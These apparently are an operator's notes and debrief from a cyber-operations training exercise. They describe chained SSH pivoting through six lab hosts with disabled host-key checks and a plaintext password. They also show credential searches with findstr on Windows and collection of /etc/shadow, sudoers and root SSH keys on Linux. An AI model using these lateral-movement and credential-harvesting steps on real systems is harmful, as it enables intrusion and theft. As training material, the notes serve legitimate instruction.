***Report unexpected operating systems to MC.
Ensure you save opnotes with :w! after each target. In the event of a terminal crash, recover lost notes with vi -r .swp
The discovery of a previously unrecorded internal interface IP needs to be reported to the analyst.

Scheme of Maneuver:
> T1: 10.50.27.188
-> T2: 10.145.117.10
--> T3: 10.145.117.16
---> T4: 192.169.117.200
---> T5: 192.169.117.201
----> T6: 129.168.117.54

T1 >>Entry Router<<
Hostname: EXT_RTR
IP: 10.50.27.188 // 10.145.117.86
OS: CentOS7
ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@10.50.27.188 -p 22011
password4
<vetting start>
<vetting ends>
Action: @Confirm credentials successful in previous operations via SSH masquerade and redirect to the next target.


T2
Hostname: SERVER0
IP: 10.145.117.10
OS: Windows v unknown
ssh -S /tmp/T1 bad -O forward -L 2222:10.145.117.10:22012
ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
password4
<vetting start>
<vetting ends>
Action: Perform SSH masquerade. Conduct system wide search for hmailserver credentials, and @@@collect if found. In previous operations, this has been achieved with either:
dir C:\ /s /b | findstr /c:"password" /c:"cred" 
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
Redirect to the next target.

T3
Hostname: Suspected networking device
IP: 10.145.117.16
**OS: Unknown
**Creds: Unknown
**Last Known SSH Port: Unknown
ssh -S /tmp/T2 bad -O forward -L 3333:10.145.117.16:22012
ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
password4
<vetting start>

Action: Perform SSH masquerade and redirect to the next target.


T4
Hostname: ADMIN2
Local IP: 192.169.117.200
**OS: Linux v unknown
**Creds: Unknown
**Last Known SSH Port: Unknown
ssh -S /tmp/T3 bad -O forward -L 4444:192.169.117.200:22013
ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
password4
<vetting start>
<vetting ends>
Action: Perform SSH masquerade and conduct @@device survey. Harvest any credentials found. Perform c@@@ollection of the following, if found:

    .ssh files from root and users
    passwd/group/shadow files
    history file from root user
    *syslog*.conf
    /etc/sudoers
    .ssh files from root and your user
    RDP Credentials
    
sudo ls -latr /root/.ssh
sudo cat /root/.ssh/authorized_keys
cat /etc/passwd
sudo /etc/shadow
sudo cat /etc/group
sudo md5sum /etc/group
sudo md5sum /etc/sudoers
sudo cat /etc/sudoers
sudo cat /root/.bashrc

@@@Collect any additional files identified by analyst. Maneuver to the next target.

####DISCONNECT from T4 before T5####

T5
Hostname: TARGETA
Local IP: 192.169.117.201
**OS: Linux v. unknown
**Creds: Unknown
**Last Known SSH Port: Unknown
ssh -S /tmp/T3 bad -O forward -L 5555:192.169.117.201:22013
ssh -MS /tmp/T5 -p 5555 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
password4
<vetting start>
<vetting ends>
Action: Perform SSH masquerade and conduct device @@survey. Redirect to the next target.


T6
Hostname: TARGETA_Admin
Local IP: 129.168.117.54
**OS: Windows v. unknown
**Creds: Unknown
**Last Known SSH Port: Unknown
ssh -S /tmp/T5 bad -O forward -L 6666:129.168.117.54:22013
ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
password4
<vetting start>
<vetting ends>
Action: Perform SSH masquerade and conduct device @@survey. Conclude operation.

DEBRIEF!!!

DEBRIEF 

Operator: 1LT An

Operation: DRYRUN03

MC: mc1

Analyst: analyst1

Description: DRYRUN03 is a C-ISR mission. On T1, we redirected to T2. On T2, we performed searches to collect credentials, which we did not find, and we redirected to T3. On T3, we redirected to T4. On T4, we collected four files but no credentials were found. We disconnected from T4. We redirect from T3 to T5. On T5, we performed survey and redirected to T6. On T6, we performed survey and concluded our operation. For FUOP, we need to revisit T2 to search further for any creds and revisit T5 to collect suspicious files on the device.

Possible violation/point deduction:
T2 cred search attempted but nothing collected
missed non-standards?
rsyslog remote config
